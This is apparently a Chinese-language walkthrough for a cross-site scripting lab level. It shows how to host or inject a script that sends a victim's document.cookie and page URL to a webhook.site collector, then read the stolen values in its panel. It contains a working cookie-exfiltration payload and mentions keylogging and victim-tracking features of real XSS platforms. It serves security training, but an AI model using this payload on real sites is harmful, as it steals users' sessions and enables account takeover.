思路提示

本关以 webhook.site 为例演练「生成收信地址 → 托管/注入 payload → 受害者回连 → 面板查看命中记录」这条链路。先把 webhook.site 的唯一地址拿到，再把它填进 payload；如果想让靶场自动判定通关，就改用页面下方「靶内替代方案」的收信地址。

详细解题过程（点击展开）
1. 生成收信地址
打开 https://webhook.site/，复制页面自动生成的唯一 URL，形如：https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx。

2. 构造 payload
把地址填进脚本，并带上 cookie、页面地址与来源页：
<script>new Image().src='https://webhook.site/你的唯一地址&c='+encodeURIComponent(document.cookie)+'&u='+encodeURIComponent(location.href);</script>

3. 托管 / 注入 payload
两种投放方式：① 注入前面关卡的反射 / 存储 / DOM 注入点；② 用本页「靶内替代方案 2」的托管框把这段脚本写到 uploads/xss/platform/<token>.html，得到可直接访问的地址。

4. 模拟受害者访问
打开托管地址或注入页面，浏览器执行脚本，向 webhook.site 发起 GET 请求。

5. 在 webhook.site 面板查看命中记录
左侧 Requests 出现新记录：Query String 里的 c 解码后就是 document.cookie；同时能看到 Source IP、User-Agent、Referer、完整 Headers 与命中时间。

6. 想自动判定通关时
webhook.site 不会把记录回传给靶场，因此页面不会自动判定。改用「靶内替代方案」：复制页面给出的靶内收信地址，按默认 payload 托管并访问，靶内收信记录出现 恭喜你完成本关挑战！ 即显示「通关成功」；点「清理本次演练数据」可重复练习。

真实平台差异：公开平台会额外提供短链接、payload 加密、键盘记录与受害者列表；核心链路仍是「托管 → 访问 → 回连 → 收信」。
